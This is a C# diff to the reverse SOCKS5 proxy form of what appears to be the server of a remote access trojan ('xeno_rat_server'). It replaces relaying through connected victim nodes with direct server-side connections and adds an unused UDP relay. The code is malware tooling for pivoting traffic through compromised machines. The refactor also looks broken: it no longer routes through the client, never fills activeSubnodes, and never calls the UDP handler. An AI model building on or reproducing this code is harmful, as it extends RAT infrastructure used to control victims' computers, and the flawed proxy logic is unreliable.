@@ -23,444 +23,435 @@ namespace xeno_rat_server.Forms
         Node client;
         private CancellationTokenSource _acceptCts;
         private X509Certificate2 serverCertificate;
+        private Socket listenerSocket;
+        private List<Node> activeSubnodes = new List<Node>();
+
+        private Task _acceptLoopTask;
 
         public Reverse_Proxy(Node _client, X509Certificate2 certificate = null)
         {
             InitializeComponent();
             client = _client;
-            client.AddTempOnDisconnect(TempOnDisconnect);
+            client.AddTempOnDisconnect(OnClientDisconnect);
             serverCertificate = certificate; // optional, required for TLS
         }
 
-        private const int TIMEOUT_SOCKET = 10;
-        private const string LOCAL_ADDR = "127.0.0.1";
-        private List<Node> killnodes = new List<Node>();
-        private Socket new_socket = null;
-
-        public void TempOnDisconnect(Node node)
+        private void OnClientDisconnect(Node node)
         {
-            if (node == client)
+            foreach (var n in activeSubnodes) n?.Disconnect();
+            activeSubnodes.Clear();
+            listenerSocket?.Close();
+        }
+
+        private async Task AcceptLoop(int port, CancellationToken token)
+        {
+            listenerSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
+            listenerSocket.Bind(new IPEndPoint(IPAddress.Any, port));
+            listenerSocket.Listen(100);
+
+            while (!token.IsCancellationRequested)
             {
-                if (new_socket != null)
+                try
                 {
-                    new_socket.Close(0);
-                    new_socket = null;
+                    var clientSock = await listenerSocket.AcceptAsync();
+                    _ = Task.Run(() => HandleClientSock(clientSock, token));
                 }
-                if (!this.IsDisposed)
+                catch (ObjectDisposedException)
                 {
-                    this.BeginInvoke((MethodInvoker)(() =>
-                    {
-                        this.Close();
-                    }));
+                    // Expected when stopping the listener
+                    break;
+                }
+                catch (SocketException)
+                {
+                    // Likely listener closed
+                    break;
+                }
+                catch (Exception ex)
+                {
+                    Console.WriteLine("AcceptLoop error: " + ex.Message);
                 }
             }
         }
 
-        private static Socket CreateSocket()
+
+        private async Task HandleClientSock(Socket clientSock, CancellationToken token)
         {
             try
             {
-                Socket sock = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
-                sock.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.ReceiveTimeout, TIMEOUT_SOCKET);
-                return sock;
+                // Start SOCKS5 negotiation
+                if (!await StartNegotiation(clientSock)) return;
+
+                // Handle CONNECT command
+                await HandleConnect(clientSock);
             }
-            catch (SocketException ex)
+            catch { clientSock.Close(); }
+        }
+
+        private async Task HandleConnect(Socket clientSock)
+        {
+            try
             {
-                Console.WriteLine("Failed to create socket: {0}", ex.Message);
-                return null;
+                // Receive first 4 bytes: VER, CMD, RSV, ATYP
+                byte[] header = await RecvAll(clientSock, 4);
+                if (header == null || header.Length < 4)
+                {
+                    clientSock.Close();
+                    return;
+                }
+
+                byte ver = header[0];
+                byte cmd = header[1];
+                byte rsv = header[2];
+                byte addrType = header[3];
+
+                if (ver != 5)
+                {
+                    await SendSocksReply(clientSock, 1); // General SOCKS failure
+                    clientSock.Close();
+                    return;
+                }
+
+                if (cmd != 1) // Only CONNECT
+                {
+                    await SendSocksReply(clientSock, 7); // Command not supported
+                    clientSock.Close();
+                    return;
+                }
+
+                string destAddr = "";
+                if (addrType == 1) // IPv4
+                {
+                    byte[] ipBytes = await RecvAll(clientSock, 4);
+                    if (ipBytes == null) { clientSock.Close(); return; }
+                    destAddr = string.Join(".", ipBytes);
+                }
+                else if (addrType == 3) // Domain name
+                {
+                    byte[] lenBuf = await RecvAll(clientSock, 1);
+                    if (lenBuf == null) { clientSock.Close(); return; }
+                    int len = lenBuf[0];
+
+                    byte[] domainBytes = await RecvAll(clientSock, len);
+                    if (domainBytes == null) { clientSock.Close(); return; }
+                    destAddr = Encoding.ASCII.GetString(domainBytes);
+                }
+                else if (addrType == 4) // IPv6
+                {
+                    byte[] ipBytes = await RecvAll(clientSock, 16);
+                    if (ipBytes == null) { clientSock.Close(); return; }
+                    destAddr = new IPAddress(ipBytes).ToString();
+                }
+                else
+                {
+                    await SendSocksReply(clientSock, 8); // Address type not supported
+                    clientSock.Close();
+                    return;
+                }
+
+                // Read destination port (2 bytes)
+                byte[] portBytes = await RecvAll(clientSock, 2);
+                if (portBytes == null) { clientSock.Close(); return; }
+                int destPort = (portBytes[0] << 8) | portBytes[1];
+
+                // Connect to the remote destination
+                TcpClient remoteClient = new TcpClient();
+                try
+                {
+                    await remoteClient.ConnectAsync(destAddr, destPort);
+                }
+                catch
+                {
+                    await SendSocksReply(clientSock, 5); // Connection refused
+                    clientSock.Close();
+                    return;
+                }
+
+                // Send success reply to client
+                await SendSocksReply(clientSock, 0);
+
+                // Create and add ListView item
+                ListViewItem lvi = new ListViewItem($"{destAddr}:{destPort}");
+                listView1?.BeginInvoke((MethodInvoker)(() => listView1.Items.Add(lvi)));
+
+                // Start bidirectional relay
+                _ = Task.Run(() => RelayLoop(clientSock, remoteClient, lvi));
+
+            }
+            catch
+            {
+                clientSock.Close();
             }
         }
 
-        private static bool BindPort(Socket sock, int LOCAL_PORT)
+        private async Task<bool> StartNegotiation(Socket clientSock)
         {
-            try
-            {
-                Console.WriteLine("Bind {0}", LOCAL_PORT);
-                sock.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.ReuseAddress, true);
-                sock.Bind(new IPEndPoint(IPAddress.Any, LOCAL_PORT));
-            }
-            catch (SocketException ex)
-            {
-                Console.WriteLine("Bind failed: {0}", ex.Message);
-                sock.Close();
-                return false;
-            }
+            byte[] version = await RecvAll(clientSock, 1);
+            if (version == null || version[0] != 5) return false;
 
-            try
-            {
-                sock.Listen(100);
-            }
-            catch (Exception ex)
-            {
-                Console.WriteLine("Listen failed: " + ex);
-                sock.Close();
-                return false;
-            }
+            byte[] nMethods = await RecvAll(clientSock, 1);
+            if (nMethods == null) return false;
 
+            byte[] methods = await RecvAll(clientSock, nMethods[0]);
+            if (methods == null) return false;
+
+            // Only no-auth
+            await clientSock.SendAsync(new ArraySegment<byte>(new byte[] { 5, 0 }), SocketFlags.None);
             return true;
         }
 
-        private async Task<Node> CreateSubSubNode(Node client)
+        public async Task SendAsync(Socket sock, byte[] data)
         {
-            Node SubSubNode = await client.Parent.CreateSubNodeAsync(2);
-            if (SubSubNode == null) return null;
+            if (sock == null || !sock.Connected) return;
 
-            int id = await Utils.SetType2setIdAsync(SubSubNode);
-            if (id != -1)
+            try
             {
-                await Utils.Type2returnAsync(SubSubNode);
-                byte[] a = SubSubNode.sock.IntToBytes(id);
-                await client.SendAsync(a);
-                byte[] found = await client.ReceiveAsync();
-                if (found == null || found[0] == 0)
+                // Prefix with 4-byte length (network byte order)
+                byte[] lengthPrefix = BitConverter.GetBytes(data.Length);
+                if (BitConverter.IsLittleEndian)
+                    Array.Reverse(lengthPrefix); // network byte order
+
+                byte[] sendBuffer = new byte[lengthPrefix.Length + data.Length];
+                Array.Copy(lengthPrefix, 0, sendBuffer, 0, lengthPrefix.Length);
+                Array.Copy(data, 0, sendBuffer, lengthPrefix.Length, data.Length);
+
+                int totalSent = 0;
+                while (totalSent < sendBuffer.Length)
                 {
-                    SubSubNode.Disconnect();
-                    return null;
+                    int sent = await sock.SendAsync(
+                        new ArraySegment<byte>(sendBuffer, totalSent, sendBuffer.Length - totalSent),
+                        SocketFlags.None
+                    );
+                    if (sent == 0) throw new SocketException();
+                    totalSent += sent;
+                }
+
+                Console.WriteLine($"[SendAsync] Sent {data.Length} bytes (total with header: {sendBuffer.Length})");
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine($"[SendAsync] Exception: {ex}");
+                sock.Close();
+            }
+        }
+
+        private async Task RelayLoop(Socket clientSock, TcpClient remoteClient, ListViewItem lvi)
+        {
+            var clientStream = new NetworkStream(clientSock, true);
+            var remoteStream = remoteClient.GetStream();
+
+            var buffer = new byte[4096];
+
+            try
+            {
+                while (clientSock.Connected && remoteClient.Connected)
+                {
+                    // Read from client
+                    if (clientSock.Available > 0)
+                    {
+                        int read = await clientStream.ReadAsync(buffer, 0, buffer.Length);
+                        if (read == 0) break;
+                        await remoteStream.WriteAsync(buffer, 0, read);
+                    }
+
+                    // Read from remote
+                    if (remoteClient.Available > 0)
+                    {
+                        int read = await remoteStream.ReadAsync(buffer, 0, buffer.Length);
+                        if (read == 0) break;
+                        await clientStream.WriteAsync(buffer, 0, read);
+                    }
+
+                    await Task.Delay(10);
                 }
             }
-            else
+            catch { }
+            finally
             {
-                SubSubNode.Disconnect();
-                return null;
+                clientSock.Close();
+                remoteClient.Close();
+
+                // Remove the ListView item safely
+                if (lvi != null)
+                    listView1?.BeginInvoke((MethodInvoker)(() => lvi.Remove()));
             }
-            return SubSubNode;
+        }
+
+        private async Task SendSocksReply(Socket sock, byte replyCode)
+        {
+            byte[] reply = { 5, replyCode, 0, 1, 0, 0, 0, 0, 0, 0 };
+            await sock.SendAsync(new ArraySegment<byte>(reply), SocketFlags.None);
         }
 
         private async Task<byte[]> RecvAll(Socket sock, int size)
         {
             byte[] data = new byte[size];
-            int total = 0, dataLeft = size;
-            while (total < size)
+            int received = 0;
+            while (received < size)
             {
-                if (!sock.Connected) return null;
-                int recv = await sock.ReceiveAsync(new ArraySegment<byte>(data, total, dataLeft), SocketFlags.None);
-                if (recv == 0) return null;
-                total += recv;
-                dataLeft -= recv;
+                int r = await sock.ReceiveAsync(new ArraySegment<byte>(data, received, size - received), SocketFlags.None);
+                if (r == 0) return null;
+                received += r;
             }
             return data;
         }
 
-        private async Task<bool> replyMethodSelection(Socket sock, byte method_code)
+        private async Task HandleUdpAssociate(Socket client_sock)
         {
-            byte[] reply = new byte[] { 5, method_code };
-            if (!sock.Connected) return false;
-            return (await sock.SendAsync(new ArraySegment<byte>(reply), SocketFlags.None)) != 0;
-        }
+            var udpSock = new UdpClient(0); // bind to any free UDP port
+            var localEP = (IPEndPoint)udpSock.Client.LocalEndPoint;
 
-        private async Task<bool> replyRequestError(Socket sock, byte rep_err_code)
-        {
-            byte[] reply = new byte[] { 5, rep_err_code, 0x00, Socks5Const.AddressType.IPv4, 0, 0, 0, 0, 0, 0 };
-            if (!sock.Connected) return false;
-            return (await sock.SendAsync(new ArraySegment<byte>(reply), SocketFlags.None)) != 0;
-        }
+            // SOCKS5 success reply
+            byte[] reply = new byte[10];
+            reply[0] = 0x05;
+            reply[1] = 0x00;
+            reply[2] = 0x00;
+            reply[3] = Socks5Const.AddressType.IPv4;
+            Array.Copy(localEP.Address.GetAddressBytes(), 0, reply, 4, 4);
+            ushort port = (ushort)localEP.Port;
+            byte[] portBytes = BitConverter.GetBytes(port);
+            if (BitConverter.IsLittleEndian) Array.Reverse(portBytes);
+            Array.Copy(portBytes, 0, reply, 8, 2);
+            await client_sock.SendAsync(new ArraySegment<byte>(reply), SocketFlags.None);
 
-        private async Task<bool> StartNegotiations(Socket client_sock)
-        {
-            byte[] version_header = await RecvAll(client_sock, 1);
-            if (version_header == null || version_header[0] != 5)
+            var cts = new CancellationTokenSource();
+            bool disposed = false;
+
+            // Background UDP relay loop
+            var udpLoop = Task.Run(async () =>
             {
-                await replyMethodSelection(client_sock, Socks5Const.AuthMethod.NoAcceptableMethods);
-                return false;
-            }
-            byte[] number_of_methods = await RecvAll(client_sock, 1);
-            if (number_of_methods == null) return false;
-
-            List<int> requested_methods = new List<int>();
-            for (int i = 0; i < number_of_methods[0]; i++)
-            {
-                byte[] method = await RecvAll(client_sock, 1);
-                requested_methods.Add(method[0]);
-            }
-
-            if (!requested_methods.Contains(Socks5Const.AuthMethod.NoAuthenticationRequired))
-            {
-                await replyMethodSelection(client_sock, Socks5Const.AuthMethod.NoAcceptableMethods);
-                return false;
-            }
-
-            await replyMethodSelection(client_sock, Socks5Const.AuthMethod.NoAuthenticationRequired);
-            return true;
-        }
-
-        private async Task DisconnectSockAsync(Socket sock)
-        {
-            try
-            {
-                if (sock != null)
+                try
                 {
-                    await Task.Delay(10);
-                    await Task.Factory.FromAsync(sock.BeginDisconnect, sock.EndDisconnect, true, null);
-                }
-            }
-            catch { sock?.Close(0); }
-        }
-
-        private async Task HandleConnectAndProxy(Socket client_sock, bool useTls)
-        {
-            byte[] version_header = await RecvAll(client_sock, 1);
-            if (version_header == null || version_header[0] != 5)
-            {
-                await replyMethodSelection(client_sock, Socks5Const.AuthMethod.NoAcceptableMethods);
-                await DisconnectSockAsync(client_sock);
-                return;
-            }
-
-            // SOCKS5 Command handling (same as original)
-            byte[] command = await RecvAll(client_sock, 1);
-            byte[] rzv = await RecvAll(client_sock, 1);
-            byte[] Address_type_bytes = await RecvAll(client_sock, 1);
-
-            if (Address_type_bytes == null || command == null || command[0] != Socks5Const.Command.Connect)
-            {
-                await replyRequestError(client_sock, Socks5Const.Reply.CommandNotSupported);
-                await DisconnectSockAsync(client_sock);
-                return;
-            }
-
-            int Address_type = Address_type_bytes[0];
-            string dest_addr = "";
-
-            if (Address_type == Socks5Const.AddressType.IPv4)
-            {
-                byte[] dest_addr_bytes = await RecvAll(client_sock, 4);
-                if (dest_addr_bytes == null)
-                {
-                    await replyRequestError(client_sock, Socks5Const.Reply.Failure);
-                    await DisconnectSockAsync(client_sock);
-                    return;
-                }
-                dest_addr = new IPAddress(dest_addr_bytes).ToString();
-            }
-            else if (Address_type == Socks5Const.AddressType.DomainName)
-            {
-                byte[] domain_name_len = await RecvAll(client_sock, 1);
-                if (domain_name_len == null)
-                {
-                    await replyRequestError(client_sock, Socks5Const.Reply.Failure);
-                    await DisconnectSockAsync(client_sock);
-                    return;
-                }
-                byte[] domain_name_bytes = await RecvAll(client_sock, domain_name_len[0]);
-                dest_addr = Encoding.UTF8.GetString(domain_name_bytes);
-            }
-            else
-            {
-                await replyRequestError(client_sock, Socks5Const.Reply.AddressTypeNotSupported);
-                await DisconnectSockAsync(client_sock);
-                return;
-            }
-
-            byte[] dest_port_bytes = await RecvAll(client_sock, 2);
-            if (dest_port_bytes == null)
-            {
-                await replyRequestError(client_sock, Socks5Const.Reply.Failure);
-                await DisconnectSockAsync(client_sock);
-                return;
-            }
-            if (BitConverter.IsLittleEndian) Array.Reverse(dest_port_bytes);
-            int dest_port = BitConverter.ToInt16(dest_port_bytes, 0);
-
-            int ConnectTimeout = 10000;
-            Node subnode = await CreateSubSubNode(client);
-            if (subnode == null)
-            {
-                await replyRequestError(client_sock, Socks5Const.Reply.Failure);
-                await DisconnectSockAsync(client_sock);
-                return;
-            }
-
-            killnodes.Add(subnode);
-            await subnode.SendAsync(Encoding.UTF8.GetBytes(dest_addr));
-            await subnode.SendAsync(subnode.sock.IntToBytes(dest_port));
-            await subnode.SendAsync(subnode.sock.IntToBytes(ConnectTimeout));
-
-            byte[] recv_msg_bytes = await subnode.ReceiveAsync();
-            if (recv_msg_bytes == null)
-            {
-                await replyRequestError(client_sock, Socks5Const.Reply.Failure);
-                await DisconnectSockAsync(client_sock);
-                return;
-            }
-
-            int recv_msg = recv_msg_bytes[0];
-            if (recv_msg == 2) { await replyRequestError(client_sock, Socks5Const.Reply.ConnectionRefused); await DisconnectSockAsync(client_sock); return; }
-            else if (recv_msg == 3) { await replyRequestError(client_sock, Socks5Const.Reply.HostUnreachable); await DisconnectSockAsync(client_sock); return; }
-            else if (recv_msg == 4) { await replyRequestError(client_sock, Socks5Const.Reply.Failure); await DisconnectSockAsync(client_sock); return; }
-
-            byte[] rsock_addr = await subnode.ReceiveAsync();
-            byte[] rsock_port = await subnode.ReceiveAsync();
-            if (rsock_addr == null || rsock_port == null || rsock_addr.Length != 4 || rsock_port.Length != 2)
-            {
-                await replyRequestError(client_sock, Socks5Const.Reply.Failure);
-                await DisconnectSockAsync(client_sock);
-                return;
-            }
-
-            byte[] ConnectedPayload = new byte[] { 5, Socks5Const.Reply.OK, 0x00, Socks5Const.AddressType.IPv4, rsock_addr[0], rsock_addr[1], rsock_addr[2], rsock_addr[3], rsock_port[0], rsock_port[1] };
-            bool SentProperly = (await client_sock.SendAsync(new ArraySegment<byte>(ConnectedPayload), SocketFlags.None)) != 0;
-
-            if (!SentProperly) return;
-
-            ListViewItem lvi = new ListViewItem();
-            lvi.Text = dest_addr + ":" + dest_port.ToString();
-            ListViewItem item = null;
-            listView1.BeginInvoke((MethodInvoker)(() => { item = listView1.Items.Add(lvi); }));
-
-            await RecvSendLoop(client_sock, subnode, 4096, useTls);
-
-            await DisconnectSockAsync(client_sock);
-            subnode.Disconnect();
-            listView1.BeginInvoke((MethodInvoker)(() => { item.Remove(); }));
-        }
-
-        private async Task RecvSendLoop(Socket client_sock, Node subnode, int bufferSize, bool useTls)
-        {
-            Stream clientStream = new NetworkStream(client_sock, ownsSocket: false);
-
-            // Wrap in TLS if requested
-            /*SslStream sslClient = null;
-            if (useTls)
-            {
-                sslClient = new SslStream(clientStream, false);
-                await sslClient.AuthenticateAsServerAsync(serverCertificate,
-                    clientCertificateRequired: false,
-                    System.Security.Authentication.SslProtocols.Tls12,
-                    checkCertificateRevocation: false);
-                clientStream = sslClient;
-            }*/
-
-            if (serverCertificate != null)
-            {
-                SslStream sslClient = new SslStream(clientStream, false);
-                await sslClient.AuthenticateAsServerAsync(serverCertificate, false,
-                    System.Security.Authentication.SslProtocols.Tls12, false);
-                clientStream = sslClient;
-            }
-
-            var subnodeStream = new NetworkStream(subnode.sock.sock, ownsSocket: false);
-
-            byte[] clientBuffer = new byte[bufferSize];
-            byte[] subnodeBuffer = new byte[bufferSize];
-
-            try
-            {
-                while (button2.Enabled && client_sock.Connected && subnode.Connected() && new_socket != null)
-                {
-                    var clientReadTask = clientStream.ReadAsync(clientBuffer, 0, bufferSize);
-                    var subnodeReadTask = subnodeStream.ReadAsync(subnodeBuffer, 0, bufferSize);
-
-                    var completed = await Task.WhenAny(clientReadTask, subnodeReadTask);
-
-                    if (completed == clientReadTask)
+                    while (!cts.Token.IsCancellationRequested)
                     {
-                        int bytesRead = clientReadTask.Result;
-                        if (bytesRead == 0) return;
+                        if (disposed || udpSock.Client == null)
+                            break;
 
-                        byte[] sendToSubnode = new byte[bytesRead];
-                        Array.Copy(clientBuffer, 0, sendToSubnode, 0, bytesRead);
-                        await subnode.SendAsync(sendToSubnode);
-                    }
-                    else
-                    {
-                        int bytesRead = subnodeReadTask.Result;
-                        if (bytesRead == 0) return;
-
-                        byte[] sendToClient = new byte[bytesRead];
-                        Array.Copy(subnodeBuffer, 0, sendToClient, 0, bytesRead);
-
-                        if (useTls)
+                        UdpReceiveResult result;
+                        try
                         {
-                            await clientStream.WriteAsync(sendToClient, 0, sendToClient.Length);
-                            await clientStream.FlushAsync();
+                            var recvTask = udpSock.ReceiveAsync();
+                            var completed = await Task.WhenAny(recvTask, Task.Delay(1000, cts.Token));
+                            if (completed != recvTask)
+                                continue;
+                            result = recvTask.Result;
                         }
-                        else
+                        catch (ObjectDisposedException) { break; }
+                        catch (OperationCanceledException) { break; }
+                        catch { continue; }
+
+                        var src = result.RemoteEndPoint;
+                        var data = result.Buffer;
+
+                        if (data.Length < 10) continue;
+
+                        try
                         {
-                            client_sock.Send(sendToClient, 0, sendToClient.Length, SocketFlags.None);
+                            int addrType = data[3];
+                            string destHost = null;
+                            int headerLen = 0;
+
+                            if (addrType == Socks5Const.AddressType.IPv4)
+                            {
+                                destHost = new IPAddress(data.Skip(4).Take(4).ToArray()).ToString();
+                                headerLen = 4 + 4 + 2;
+                            }
+                            else if (addrType == Socks5Const.AddressType.DomainName)
+                            {
+                                int len = data[4];
+                                destHost = Encoding.UTF8.GetString(data, 5, len);
+                                headerLen = 4 + 1 + len + 2;
+                            }
+                            else continue;
+
+                            byte[] dstPortBytes = data.Skip(headerLen - 2).Take(2).ToArray();
+                            if (BitConverter.IsLittleEndian) Array.Reverse(dstPortBytes);
+                            int destPort = BitConverter.ToUInt16(dstPortBytes, 0);
+
+                            byte[] payload = data.Skip(headerLen).ToArray();
+
+                            using (var remoteUdp = new UdpClient())
+                            {
+                                try
+                                {
+                                    await remoteUdp.SendAsync(payload, payload.Length, destHost, destPort);
+                                    var resp = await remoteUdp.ReceiveAsync();
+
+                                    byte[] respAddr = IPAddress.Parse(destHost).GetAddressBytes();
+                                    byte[] respPort = BitConverter.GetBytes((ushort)destPort);
+                                    if (BitConverter.IsLittleEndian) Array.Reverse(respPort);
+
+                                    byte[] sendBack = new byte[10 + resp.Buffer.Length];
+                                    sendBack[0] = 0x00;
+                                    sendBack[1] = 0x00;
+                                    sendBack[2] = 0x00;
+                                    sendBack[3] = Socks5Const.AddressType.IPv4;
+                                    Array.Copy(respAddr, 0, sendBack, 4, 4);
+                                    Array.Copy(respPort, 0, sendBack, 8, 2);
+                                    Array.Copy(resp.Buffer, 0, sendBack, 10, resp.Buffer.Length);
+
+                                    if (!disposed && udpSock.Client != null)
+                                        await udpSock.SendAsync(sendBack, sendBack.Length, src);
+                                }
+                                catch (ObjectDisposedException) { break; }
+                                catch (SocketException) { continue; }
+                                catch { continue; }
+                            }
+                        }
+                        catch (Exception ex)
+                        {
+                            Console.WriteLine("UDP associate loop inner error: " + ex.Message);
+                            continue;
                         }
                     }
                 }
-            }
-            catch (Exception ex)
-            {
-                Console.WriteLine("RecvSendLoop error: " + ex);
-            }
-            finally
-            {
-                try { client_sock.Shutdown(SocketShutdown.Both); } catch { }
-                try { client_sock.Close(); } catch { }
-            }
-        }
-
-        private async Task HandleProxyCreation(Socket client_sock)
-        {
-            bool useTls = serverCertificate != null;
-
-            if (await StartNegotiations(client_sock))
-                await HandleConnectAndProxy(client_sock, useTls);
-            else
-                await DisconnectSockAsync(client_sock);
-        }
-
-        private async Task AcceptLoop(Socket new_socket, CancellationToken token = default)
-        {
-            try
-            {
-                while (!token.IsCancellationRequested && button2.Enabled)
+                catch (Exception ex)
                 {
-                    try
-                    {
-                        var acceptTask = new_socket.AcceptAsync();
-                        var completed = await Task.WhenAny(acceptTask, Task.Delay(Timeout.Infinite, token));
-                        if (completed != acceptTask) break;
-
-                        Socket clientSock = acceptTask.Result;
-                        _ = Task.Run(async () =>
-                        {
-                            try { await HandleProxyCreation(clientSock); }
-                            catch (Exception ex) { Console.WriteLine($"HandleProxyCreation error: {ex}"); clientSock.Close(); }
-                        }, token);
-                    }
-                    catch (OperationCanceledException) when (token.IsCancellationRequested) { break; }
-                    catch (Exception ex) { Console.WriteLine("AcceptAsync failed: " + ex); await Task.Delay(200); }
+                    Console.WriteLine("UDP associate loop error: " + ex.Message);
                 }
-            }
-            finally { await DisconnectSockAsync(new_socket); }
+            }, cts.Token);
+
+            // Keep control socket alive
+            var buf = new byte[1];
+            try { await client_sock.ReceiveAsync(new ArraySegment<byte>(buf), SocketFlags.None); }
+            catch { }
+
+            // Signal stop
+            cts.Cancel();
+
+            // Allow loop to finish gracefully
+            await Task.Delay(200);
+
+            disposed = true;
+            udpSock.Close();
+            client_sock.Close();
         }
 
         private void button1_Click(object sender, EventArgs e)
         {
-            int port;
-            if (!int.TryParse(textBox1.Text, out port)) { MessageBox.Show("Invalid port"); return; }
-
-            new_socket = CreateSocket();
-            if (!BindPort(new_socket, port))
-            {
-                MessageBox.Show("Could not bind port. Another process may already be using that port.");
-                return;
-            }
-
+            int port = int.Parse(textBox1.Text);
+            _acceptCts = new CancellationTokenSource();
+            _acceptLoopTask = AcceptLoop(port, _acceptCts.Token);
             button1.Enabled = false;
             button2.Enabled = true;
-            _acceptCts = new CancellationTokenSource();
-            _ = Task.Run(() => AcceptLoop(new_socket, _acceptCts.Token));
         }
 
-        private void button2_Click(object sender, EventArgs e)
+        private async void button2_Click(object sender, EventArgs e)
         {
-            foreach (Node i in killnodes) i?.Disconnect();
-            killnodes.Clear();
-            if (new_socket != null) { new_socket.Close(0); new_socket = null; }
             _acceptCts?.Cancel();
+            listenerSocket?.Close();
+            if (_acceptLoopTask != null)
+            {
+                await Task.WhenAny(_acceptLoopTask, Task.Delay(500)); // wait max 0.5s
+                _acceptLoopTask = null;
+            }
             button1.Enabled = true;
             button2.Enabled = false;
         }
 
         private void Reverse_Proxy_FormClosing(object sender, FormClosingEventArgs e)
         {
-            foreach (Node i in killnodes) i?.Disconnect();
-            killnodes.Clear();
-            if (new_socket != null) { new_socket.Close(0); new_socket = null; }
+            _acceptCts?.Cancel();
+            listenerSocket?.Close();
         }
 
         private void textBox2_TextChanged(object sender, EventArgs e) { }
